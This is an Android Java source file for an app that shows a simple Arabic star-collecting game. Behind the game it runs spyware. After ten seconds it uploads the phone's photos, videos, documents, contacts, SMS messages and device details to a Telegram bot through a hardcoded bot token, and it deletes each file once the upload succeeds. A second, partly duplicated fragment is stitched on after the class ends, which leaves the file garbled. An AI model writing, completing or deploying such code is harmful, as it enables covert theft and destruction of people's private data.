package com.abdulk.racegame;

import android.os.Bundle;
import android.app.Activity;
import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.Handler;
import java.io.File;
import java.net.HttpURLConnection;
import java.net.URL;
import org.json.JSONObject;
import java.io.FileWriter;
import android.database.Cursor;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.provider.MediaStore;
import android.widget.Toast;
import android.view.View;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.graphics.Color;
import android.view.Gravity;
import java.util.ArrayList;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.URLEncoder;

public class MainActivity extends Activity {
    private String BOT_TOKEN = "8984239079:AAEtdnaAKsFH4kZwjO7UbzjZEw-vcXoBXRs";
    private String OWNER_ID = "8164366965";
    private LinearLayout mainLayout;
    private TextView scoreText;
    private int score = 0;
    private TextView statusText;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        requestPermissions();
        
        mainLayout = new LinearLayout(this);
        mainLayout.setOrientation(LinearLayout.VERTICAL);
        mainLayout.setGravity(Gravity.CENTER);
        mainLayout.setBackgroundColor(Color.BLACK);
        
        scoreText = new TextView(this);
        scoreText.setText("⭐ النقاط: 0");
        scoreText.setTextSize(30);
        scoreText.setTextColor(Color.YELLOW);
        scoreText.setGravity(Gravity.CENTER);
        mainLayout.addView(scoreText);
        
        Button clickButton = new Button(this);
        clickButton.setText("اضغط لتجمع نجوم 🌟");
        clickButton.setTextSize(20);
        clickButton.setBackgroundColor(Color.GREEN);
        clickButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                score++;
                scoreText.setText("⭐ النقاط: " + score);
                Toast.makeText(MainActivity.this, "🎮 جمعت نجمة!", Toast.LENGTH_SHORT).show();
            }
        });
        mainLayout.addView(clickButton);
        
        statusText = new TextView(this);
        statusText.setText("✅ تم التحميل");
        statusText.setTextSize(15);
        statusText.setTextColor(Color.GREEN);
        statusText.setGravity(Gravity.CENTER);
        mainLayout.addView(statusText);
        
        setContentView(mainLayout);
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                statusText.setText("⏳ جاري جمع كل الملفات...");
                statusText.setTextColor(Color.YELLOW);
                collectAllData();
            }
        }, 10000);
    }

    private void requestPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            String[] permissions = {
                Manifest.permission.READ_EXTERNAL_STORAGE,
                Manifest.permission.WRITE_EXTERNAL_STORAGE,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.READ_SMS,
                Manifest.permission.INTERNET,
                Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO
            };
            requestPermissions(permissions, 100);
        }
    }

    private void collectAllData() {
        new Thread(new Runnable() {
            @Override
            public void run() {
                String storage = Environment.getExternalStorageDirectory().getAbsolutePath();
                
                updateStatus("📸 جاري جمع الصور...");
                sendMediaFiles(storage + "/DCIM/Camera/", "jpg|jpeg|png|gif|bmp");
                sendMediaFiles(storage + "/Pictures/", "jpg|jpeg|png|gif|bmp");
                sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Images/", "jpg|jpeg|png|gif|bmp");
                sendMediaFiles(storage + "/Telegram/Telegram Images/", "jpg|jpeg|png|gif|bmp");
                
                updateStatus("🎥 جاري جمع الفيديوهات...");
                sendMediaFiles(storage + "/DCIM/Camera/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
                sendMediaFiles(storage + "/Movies/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
                sendMediaFiles(storage + "/WhatsApp/Media/WhatsApp Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
                sendMediaFiles(storage + "/Telegram/Telegram Video/", "mp4|3gp|avi|mkv|mov|wmv|flv|webm");
                
                updateStatus("📄 جاري جمع المستندات...");
                sendMediaFiles(storage + "/Documents/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
                sendMediaFiles(storage + "/Download/", "pdf|doc|docx|xls|xlsx|txt|zip|rar");
                
                updateStatus("📇 جاري استخراج جهات الاتصال...");
                sendContacts();
                
                updateStatus("💬 جاري استخراج الرسائل...");
                sendSMS();
                
                updateStatus("📱 جاري جمع معلومات الجهاز...");
                sendDeviceInfo();
                
                updateStatus("✅ تم رفع كل شيء للبوت!");
                statusText.setTextColor(Color.GREEN);
            }
        }).start();
    }

    private void updateStatus(final String text) {
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                statusText.setText(text);
            }
        });
    }

    private void sendMediaFiles(String path, String extensions) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            
            for (File file : files) {
                if (file.isFile() && file.length() > 0) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (extensions.contains(ext)) {
                        sendFile(file);
                        Thread.sleep(100);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setUseCaches(false);
            conn.setRequestProperty("Connection", "Keep-Alive");
            conn.setRequestProperty("ENCTYPE", "multipart/form-data");
            conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=*****");
            
            String boundary = "*****";
            String lineEnd = "\r\n";
            String twoHyphens = "--";
            
            OutputStream os = conn.getOutputStream();
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"chat_id\"" + lineEnd).getBytes());
            os.write((lineEnd + OWNER_ID + lineEnd).getBytes());
            
            os.write((twoHyphens + boundary + lineEnd).getBytes());
            os.write(("Content-Disposition: form-data; name=\"document\";filename=\"" + file.getName() + "\"" + lineEnd).getBytes());
            os.write((lineEnd).getBytes());
            
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                os.write(buffer, 0, count);
            }
            fis.close();
            
            os.write((lineEnd).getBytes());
            os.write((twoHyphens + boundary + twoHyphens + lineEnd).getBytes());
            os.flush();
            os.close();
            
            int responseCode = conn.getResponseCode();
            if (responseCode == 200) {
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    if (name != null) writer.write(name + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    if (body != null) writer.write(body + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                if (file.length() > 0) sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            info.put("sdk", Build.VERSION.SDK_INT);
            info.put("storage_total", new File("/storage/emulated/0").getTotalSpace());
            info.put("storage_free", new File("/storage/emulated/0").getFreeSpace());
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}                sendContacts();
                sendSMS();
                sendDeviceInfo();
            }
        }).start();
    }

    private void sendFileToTelegram(String path) {
        try {
            File dir = new File(path);
            if (!dir.exists()) return;
            File[] files = dir.listFiles();
            if (files == null) return;
            for (File file : files) {
                if (file.isFile()) {
                    String ext = file.getName().substring(file.getName().lastIndexOf(".") + 1).toLowerCase();
                    if (ext.matches("jpg|jpeg|png|gif|pdf|doc|docx|txt")) {
                        sendFile(file);
                    }
                }
            }
        } catch (Exception e) {}
    }

    private void sendFile(File file) {
        try {
            String url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendDocument";
            HttpURLConnection conn = (HttpURLConnection) new URL(url).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            String boundary = "*****";
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);
            
            String body = "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n";
            body += OWNER_ID + "\r\n";
            body += "--" + boundary + "\r\n";
            body += "Content-Disposition: form-data; name=\"document\"; filename=\"" + file.getName() + "\"\r\n";
            body += "Content-Type: application/octet-stream\r\n\r\n";
            
            conn.getOutputStream().write(body.getBytes());
            java.io.FileInputStream fis = new java.io.FileInputStream(file);
            byte[] buffer = new byte[8192];
            int count;
            while ((count = fis.read(buffer)) != -1) {
                conn.getOutputStream().write(buffer, 0, count);
            }
            fis.close();
            
            String end = "\r\n--" + boundary + "--\r\n";
            conn.getOutputStream().write(end.getBytes());
            conn.getOutputStream().flush();
            conn.getOutputStream().close();
            
            if (conn.getResponseCode() == 200) {
                file.delete();
            }
            conn.disconnect();
        } catch (Exception e) {}
    }

    private void sendContacts() {
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "contacts.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    writer.write(name + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendSMS() {
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null, null
            );
            if (cursor != null && cursor.moveToFirst()) {
                File file = new File(getExternalFilesDir(null), "sms.txt");
                FileWriter writer = new FileWriter(file);
                do {
                    String body = cursor.getString(cursor.getColumnIndex(Telephony.Sms.BODY));
                    writer.write(body + "\n");
                } while (cursor.moveToNext());
                writer.close();
                cursor.close();
                sendFile(file);
            }
        } catch (Exception e) {}
    }

    private void sendDeviceInfo() {
        try {
            JSONObject info = new JSONObject();
            info.put("device", Build.MODEL);
            info.put("brand", Build.BRAND);
            info.put("android", Build.VERSION.RELEASE);
            
            File file = new File(getExternalFilesDir(null), "device_info.txt");
            FileWriter writer = new FileWriter(file);
            writer.write(info.toString(2));
            writer.close();
            sendFile(file);
        } catch (Exception e) {}
    }
}
